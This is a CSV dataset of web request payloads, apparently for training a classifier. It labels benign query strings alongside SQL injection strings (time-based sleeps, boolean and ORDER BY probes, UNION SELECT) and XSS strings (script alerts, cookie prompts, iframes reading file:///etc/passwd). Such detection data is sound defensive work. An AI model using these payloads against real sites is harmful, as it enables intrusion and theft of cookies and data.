payload,label
price_min=1167&qty=8200&price_max=8681,benign
theme=dark&search=orders,benign
"alert(""test"")",xss
or pg_SLEEP(5)--,sqli
qty=4948&lang=en,benign
<iframe src=http://xss.rocks/scriptlet.html <,xss
ORDER BY 3,sqli
"benchmark(10000000,MD5(1))#",sqli
tab=report,benign
email=book@example.com&currency=usd,benign
callback=profile&currency=usd&q=settings,benign
color=foxtrot,benign
offset=7362,benign
"benchmark(50000000,MD5(1))#",sqli
ORDER BY 20,sqli
'));waitfor delay '0:0:5'--,sqli
user_id=6816,benign
tab=dashboard,benign
"<img src=""xxx"" onerror=""document.write('\<iframe src=file:///etc/passwd>\</iframe>')""/>",xss
city=citra&q=surakarta&search=book,benign
id=6671&offset=9153&search=orders,benign
\,sqli
session=3691889&callback=profile,benign
"""><svg><script>alert(1)</script>",xss
currency=usd&price_min=945&id=7479,benign
search=invoice,benign
size=m&lang=id&search=laptop,benign
offset=50&view=grid,benign
ORDER BY 24,sqli
qty=3250&format=json,benign
tab=laptop,benign
WHERE 1=1 AND 1=1,sqli
<sCript>alert(document.domain)</sCript>,xss
AS INJECTX WHERE 1=1 AND 1=1--,sqli
color=laptop,benign
theme=dark&view=grid,benign
name=delta,benign
<audio src/onerror=confirm(123)>,xss
%' AND 8310=8310 AND '%'=',sqli
category=book&ref=citra&lang=en,benign
qty=7470&user_id=8588,benign
redirect=/home&price_max=6732&tab=foxtrot,benign
search=echo,benign
offset=2527,benign
price_min=2435&size=m&email=delta@example.com,benign
OR x=y--,sqli
ORDER BY 31337,sqli
name=book,benign
page=3922&tab=budget&currency=usd,benign
size=m&token=122f063,benign
AND 1,sqli
ORDER BY 21,sqli
ref=laptop&size=m&lang=en,benign
ORDER BY 7,sqli
ORDER BY 2,sqli
format=json&lang=id&coupon=surakarta,benign
ORDER BY 4,sqli
format=json&price_min=6036,benign
price_max=9273&tab=dashboard&sort=desc,benign
currency=usd&sort=asc&user_id=1209,benign
callback=shoes&price_max=5861&sort=asc,benign
token=3d92027,benign
<script>alert(1)</script>,xss
category=invoice,benign
ORDER BY 12,sqli
lang=en&redirect=/home&qty=816,benign
page=6451&name=citra&lang=id,benign
ORDER BY 9,sqli
"<script>alert(""test"");</script>",xss
lang=en&price_max=2911,benign
view=grid&name=jakarta,benign
prompt(document.cookie),xss
coupon=book&callback=report,benign
AND 7300=7300 AND ('pKlZ'='pKlZ,sqli
<BODY ONLOAD=alert(document.cookie)>,xss
user_id=4106,benign
price_max=853&format=json&size=m,benign
token=404b88a,benign
"-1 UNION SELECT 1 INTO @,@",sqli
session=203f2d2&view=grid&q=delta,benign
category=orders&ref=jakarta&price_min=4307,benign
sort=asc&size=m,benign
city=shoes&limit=526&size=m,benign
ref=shoes&limit=6350&name=shoes,benign
"<script src=""http://192.168.1.6/test.js"" ></script>",xss
ORDER BY 6,sqli
ORDER BY 11,sqli
tab=budget&coupon=dashboard&format=json,benign
"<img src=""abc"" onerror=""alert(1)"">",xss
></select><img%20src=1%20onerror=alert(1)>,xss
AND 7300=7300 AND 'pKlZ'='pKlZ,sqli
price_max=4107,benign
ORDER BY 25,sqli
ORDER BY 5,sqli
email=foxtrot@example.com,benign
color=surakarta&format=json,benign
name=dashboard&theme=dark,benign
theme=dark&lang=id&ref=alice,benign
price_max=619,benign
OR 1=1--,sqli
user_id=7171,benign
redirect=/home&category=book&search=jakarta,benign
/,sqli
q=echo,benign
&&SLEEP(5),sqli
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,sqli
sort=desc&token=2777484&lang=id,benign
size=m&session=22179f5,benign
format=json&coupon=foxtrot,benign
theme=dark&size=m&redirect=/home,benign
email=echo@example.com&token=32e84b3&redirect=/home,benign
ORDER BY 26,sqli
q=report&price_max=6485,benign
"<link rel=attachment href=""file:///etc/passwd"">",xss
offset=8999,benign
<iframe onload=print()></iframe>,xss
callback=alice&city=camera&limit=1011,benign
ORDER BY 8,sqli
"""><script>alert(1)</script>",xss
format=json,benign
offset=9968,benign
ORDER BY 13,sqli
price_max=481&limit=7729,benign
AND true,sqli
';waitfor delay '0:0:5'--,sqli
city=laptop&name=delta&session=331056d,benign
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,sqli
price_max=2505,benign
ORDER BY 28,sqli
ORDER BY SLEEP(5)#,sqli
theme=dark&color=orders,benign
"<body style=""background-color:red"">",xss
"' or """,sqli
view=grid&lang=id&search=delta,benign
');waitfor delay '0:0:5'--,sqli
price_max=508&currency=usd&email=shoes@example.com,benign
';alert('1');',xss
ORDER BY 22,sqli
page=5214&search=camera&price_max=2305,benign
sort=desc&theme=dark&color=alice,benign
name=phone,benign
ORDER BY 19,sqli
""" OR """" = """,sqli
session=31b7cb4&sort=asc,benign
prompt(123),xss
1 or sleep(5)#,sqli
size=m&id=2589,benign
HAVING 1=1#,sqli
tab=foxtrot,benign
redirect=/home&price_max=1597&email=invoice@example.com,benign
page=6071&format=json,benign
"1' ORDER BY 1,2--+",sqli
ORDER BY 17,sqli
view=grid&id=6069&currency=usd,benign
lang=en&session=57ce51b,benign
ref=budi&lang=id&view=grid,benign
id=8741&email=delta@example.com&search=settings,benign
--><img src=x onerror=confirm(document.domain)>,xss
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
ref=budi&search=settings,benign
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',sqli
user_id=1295,benign
currency=usd&redirect=/home,benign
WHERE 1=1 AND 1=0,sqli
"1' GROUP BY 1,2,--+",sqli
theme=dark&sort=desc,benign
format=json&user_id=2914&size=m,benign
AND 0,sqli
color=budi,benign
ORDER BY 27,sqli
ORDER BY 23,sqli
city=delta&format=json&coupon=orders,benign
id=5322&qty=7539,benign
"benchmark(50000000,MD5(1))",sqli
sort=asc&qty=437,benign
offset=2436&token=4965162,benign
<script>alert(document.domain)</script>,xss
OR x=x#,sqli
theme=dark&sort=asc&price_max=673,benign
',sqli
ORDER BY 10,sqli
theme=dark,benign
session=520f8e5,benign
token=1b29664&redirect=/home,benign
callback=invoice,benign
"""><iframe src='https://testforiframe.site/'>",xss
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',sqli
"<IMG SRC=""javascript:alert('XSS');"">",xss
color=book&tab=foxtrot,benign
OR 1=0--,sqli
search=phone,benign
callback=citra,benign
"or benchmark(50000000,MD5(1))#",sqli
price_min=4273&name=budget&lang=en,benign
AS INJECTX WHERE 1=1 AND 1=0--,sqli
"or benchmark(50000000,MD5(1))--",sqli
category=citra&offset=2030&lang=id,benign
sort=desc&name=shoes,benign
search=settings&lang=en&format=json,benign
<marquee onstart=alert(1)></marquee>,xss
"""><script>alert(document.domain)</script>",xss
name=budget&id=7730&page=2459,benign
city=shoes&q=shoes&session=5ee77af,benign
size=m&qty=9325,benign
q=jakarta&lang=en&coupon=citra,benign
<Script>alert(1)</Script>,xss
redirect=/home&user_id=2880,benign
lang=en&id=7103&theme=dark,benign
HAVING 1=0#,sqli
price_max=7917,benign
--><script>alert(1)</script>,xss
currency=usd&page=8543,benign
"1 or benchmark(10000000,MD5(1))#",sqli
"<body onmouseover=""print()"">",xss
theme=dark&callback=delta,benign
color=camera&offset=3049,benign
color=foxtrot&email=jakarta@example.com,benign
sort=asc&qty=8317,benign
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,sqli
ORDER BY 1,sqli
waitfor delay '00:00:05'--,sqli
ORDER BY 16,sqli
session=4efdb02,benign
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,sqli
&lt;img src=0 onerror=alert(document.cookie)&gt;,xss
')) or pg_sleep(5)--,sqli
AND 7300=7300 AND ('pKlZ'='pKlY,sqli
name=profile&token=15e9771,benign
' or pg_sleep(5)--,sqli
view=grid&q=book&redirect=/home,benign
tab=jakarta&view=grid&callback=orders,benign
offset=1331,benign
token=1003a3f&limit=4755,benign
ORDER BY 30,sqli
';WAITFOR DELAY '0:0:30'--,sqli
"<body style=""background-color:red !important;"">",xss
ORDER BY 14,sqli
ORDER BY 18,sqli
search=foxtrot,benign
qty=2003&city=shoes&lang=en,benign
' UNION SELECT sum(columnname ) from tablename --,sqli
"<img src="""" onerror=""alert(document.cookie)"">",xss
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
token=5b74eb1,benign
format=json&session=583cdc0&search=profile,benign
-- or #,sqli
offset=5890&view=grid,benign
""" OR 1 = 1 -- -",sqli
theme=dark&coupon=book&email=citra@example.com,benign
search=jakarta&currency=usd,benign
price_max=7106,benign
city=book&price_max=1295&q=delta,benign
ORDER BY 29,sqli
id=1355&format=json&search=shoes,benign
));waitfor delay '0:0:5'--,sqli
%' AND 8310=8311 AND '%'=',sqli
currency=usd&name=orders,benign
